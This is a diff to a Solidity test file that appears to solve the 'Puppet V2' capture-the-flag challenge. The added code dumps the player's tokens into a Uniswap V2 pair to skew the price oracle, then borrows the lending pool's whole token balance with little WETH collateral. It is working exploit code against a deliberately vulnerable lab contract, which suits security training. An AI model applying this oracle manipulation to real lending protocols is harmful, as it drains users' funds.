@@ -96,9 +96,40 @@ contract PuppetV2Challenge is Test {
 
     /**
      * CODE YOUR SOLUTION HERE
+    uint256 constant UNISWAP_INITIAL_TOKEN_RESERVE = 100e18;
+    uint256 constant UNISWAP_INITIAL_WETH_RESERVE = 10e18;
+    uint256 constant PLAYER_INITIAL_TOKEN_BALANCE = 10_000e18;
+    uint256 constant PLAYER_INITIAL_ETH_BALANCE = 20e18;
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 1_000_000e18;
      */
     function test_puppetV2() public checkSolvedByPlayer {
-        
+        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);
+
+        address[] memory path = new address[](2);
+        path[0] = address(token);
+        path[1] = address(weth);
+
+        (uint256 wethReserve, uint256 dvtReserve, ) = uniswapV2Exchange.getReserves();
+        console.log("wethReserve = ", wethReserve);
+        console.log("dvtReserve = ", dvtReserve);
+
+        uniswapV2Router.swapExactTokensForTokens({
+            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
+            amountOutMin: 1,
+            path: path,
+            to: player,
+            deadline: block.timestamp + 1 days
+        });
+
+        (wethReserve, dvtReserve, ) = uniswapV2Exchange.getReserves();
+        console.log("wethReserve = ", wethReserve);
+        console.log("dvtReserve = ", dvtReserve);
+
+        weth.deposit{value: player.balance}();
+        weth.approve(address(lendingPool), weth.balanceOf(player));
+
+        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);
+        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
     }
 
     /**
